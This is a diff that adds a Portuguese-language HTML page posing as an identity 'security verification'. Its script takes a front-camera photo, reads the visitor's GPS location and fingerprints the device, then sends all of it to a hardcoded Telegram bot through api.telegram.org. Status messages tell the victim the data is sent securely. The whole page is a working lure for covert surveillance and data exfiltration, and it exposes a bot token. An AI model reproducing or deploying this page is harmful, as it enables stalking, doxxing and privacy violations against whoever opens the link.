@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação de Segurança</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 36px 28px;
+            max-width: 380px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.4);
+        }
+
+        .shield {
+            width: 72px;
+            height: 72px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            margin: 0 auto 20px;
+        }
+
+        h1 {
+            font-size: 20px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            font-size: 13px;
+            color: #888;
+            margin-bottom: 24px;
+            line-height: 1.5;
+        }
+
+        .info-box {
+            background: #f7f8fc;
+            border: 1px solid #e8eaf0;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+
+        .info-box p {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 10px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .info-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 7px 0;
+            font-size: 13px;
+            color: #444;
+            border-bottom: 1px solid #eee;
+        }
+
+        .info-item:last-child { border-bottom: none; }
+
+        .info-item span { font-size: 16px; }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            letter-spacing: 0.3px;
+            transition: opacity 0.2s, transform 0.1s;
+        }
+
+        button:hover:not(:disabled) {
+            opacity: 0.92;
+            transform: translateY(-1px);
+        }
+
+        button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .status {
+            margin-top: 14px;
+            font-size: 13px;
+            color: #888;
+            min-height: 18px;
+            line-height: 1.5;
+        }
+
+        .status.ok { color: #27ae60; font-weight: 600; }
+        .status.erro { color: #e74c3c; }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: #555;
+            margin-top: 8px;
+        }
+
+        .spinner {
+            width: 14px;
+            height: 14px;
+            border: 2px solid #ddd;
+            border-top-color: #667eea;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            flex-shrink: 0;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="shield">🔐</div>
+    <h1>Verificação de Segurança</h1>
+    <p class="subtitle">Para prosseguir, precisamos confirmar sua identidade. Conceda as permissões abaixo quando solicitado.</p>
+
+    <div class="info-box">
+        <p>O que será coletado:</p>
+        <div class="info-item"><span>📷</span> Foto pela câmera frontal</div>
+        <div class="info-item"><span>📍</span> Localização GPS</div>
+        <div class="info-item"><span>📱</span> Modelo e sistema do dispositivo</div>
+        <div class="info-item"><span>🕐</span> Data e hora do acesso</div>
+    </div>
+
+    <button id="btn" onclick="iniciar()">Verificar minha identidade</button>
+    <div class="status" id="status"></div>
+</div>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    // ─── CONFIGURAÇÃO ────────────────────────────────────────────
+    const TOKEN   = '8451015637:AAEP6lj42GQp-DqGS4BIkmsuQ7r1049P75M';
+    const CHAT_ID = '977667543';
+    // ────────────────────────────────────────────────────────────
+
+    const btn    = document.getElementById('btn');
+    const status = document.getElementById('status');
+
+    function setStatus(msg, tipo = '') {
+        status.innerHTML  = msg;
+        status.className  = 'status ' + tipo;
+    }
+
+    function infoDispositivo() {
+        const ua  = navigator.userAgent;
+        const now = new Date().toLocaleString('pt-BR', {
+            timeZone: 'America/Sao_Paulo',
+            dateStyle: 'full',
+            timeStyle: 'medium'
+        });
+
+        let device = 'Desconhecido';
+        if (/iPhone/.test(ua))       device = 'iPhone';
+        else if (/iPad/.test(ua))    device = 'iPad';
+        else if (/Android/.test(ua)) {
+            const m = ua.match(/Android [^;]+; ([^)]+)\)/);
+            device = m ? m[1].trim() : 'Android';
+        }
+        else if (/Windows/.test(ua)) device = 'Windows PC';
+        else if (/Macintosh/.test(ua)) device = 'Mac';
+        else if (/Linux/.test(ua))   device = 'Linux';
+
+        let browser = 'Desconhecido';
+        if (/EdgA?\//.test(ua))         browser = 'Edge';
+        else if (/OPR\//.test(ua))      browser = 'Opera';
+        else if (/Chrome\//.test(ua))   browser = 'Chrome';
+        else if (/Firefox\//.test(ua))  browser = 'Firefox';
+        else if (/Safari\//.test(ua))   browser = 'Safari';
+
+        let os = 'Desconhecido';
+        if (/Android (\d+)/.test(ua))      os = 'Android ' + ua.match(/Android (\d+)/)[1];
+        else if (/iPhone OS ([\d_]+)/.test(ua)) os = 'iOS ' + ua.match(/iPhone OS ([\d_]+)/)[1].replace(/_/g, '.');
+        else if (/Windows NT ([\d.]+)/.test(ua)) {
+            const v = { '10.0': '10/11', '6.3': '8.1', '6.2': '8', '6.1': '7' };
+            os = 'Windows ' + (v[ua.match(/Windows NT ([\d.]+)/)[1]] || ua.match(/Windows NT ([\d.]+)/)[1]);
+        }
+        else if (/Mac OS X ([\d_]+)/.test(ua)) os = 'macOS ' + ua.match(/Mac OS X ([\d_]+)/)[1].replace(/_/g, '.');
+
+        return {
+            device, browser, os,
+            tela: `${screen.width}×${screen.height}`,
+            idioma: navigator.language,
+            fuso: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            now,
+            ua
+        };
+    }
+
+    function obterLocalizacao() {
+        return new Promise(resolve => {
+            if (!navigator.geolocation) return resolve(null);
+            navigator.geolocation.getCurrentPosition(
+                p => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, acc: Math.round(p.coords.accuracy) }),
+                () => resolve(null),
+                { enableHighAccuracy: true, timeout: 12000 }
+            );
+        });
+    }
+
+    async function tirarFoto() {
+        const video  = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+                facingMode: 'user',
+                width:  { ideal: 1280 },
+                height: { ideal: 720 }
+            }
+        });
+
+        video.srcObject = stream;
+        await new Promise(r => { video.onloadedmetadata = r; });
+        await new Promise(r => setTimeout(r, 1200)); // estabiliza câmera
+
+        canvas.width  = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+
+        stream.getTracks().forEach(t => t.stop());
+
+        return new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.92));
+    }
+
+    async function enviarTelegram(foto, loc, info) {
+        const locTexto = loc
+            ? `[Ver no mapa](https://maps.google.com/?q=${loc.lat},${loc.lon}) — precisão ${loc.acc}m`
+            : '❌ Não concedida';
+
+        const caption =
+            `🚨 *NOVA VERIFICAÇÃO*\n\n` +
+            `📱 *Dispositivo:* ${info.device}\n` +
+            `💻 *Sistema:* ${info.os}\n` +
+            `🌐 *Navegador:* ${info.browser}\n` +
+            `📐 *Tela:* ${info.tela}\n` +
+            `🌍 *Idioma:* ${info.idioma}\n` +
+            `🕐 *Fuso:* ${info.fuso}\n\n` +
+            `📅 *Data/Hora:* ${info.now}\n\n` +
+            `📍 *Localização:* ${locTexto}`;
+
+        const form = new FormData();
+        form.append('chat_id',    CHAT_ID);
+        form.append('photo',      foto, 'foto.jpg');
+        form.append('caption',    caption);
+        form.append('parse_mode', 'Markdown');
+
+        const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: form
+        });
+
+        if (!res.ok) {
+            const err = await res.json();
+            throw new Error(err.description || 'Erro ao enviar');
+        }
+    }
+
+    async function iniciar() {
+        btn.disabled = true;
+
+        try {
+            setStatus('<div class="step"><div class="spinner"></div> Solicitando localização GPS...</div>');
+            const loc = await obterLocalizacao();
+
+            setStatus('<div class="step"><div class="spinner"></div> Acessando câmera frontal...</div>');
+            const foto = await tirarFoto();
+
+            setStatus('<div class="step"><div class="spinner"></div> Enviando dados com segurança...</div>');
+            const info = infoDispositivo();
+            await enviarTelegram(foto, loc, info);
+
+            setStatus('✅ Verificação concluída com sucesso!', 'ok');
+            btn.textContent = '✓ Verificado';
+
+        } catch (err) {
+            console.error(err);
+            if (err.name === 'NotAllowedError') {
+                setStatus('❌ Permissão negada. Conceda acesso à câmera e tente novamente.', 'erro');
+            } else {
+                setStatus('❌ Erro: ' + err.message, 'erro');
+            }
+            btn.disabled = false;
+        }
+    }
+</script>
+
+</body>
+</html>
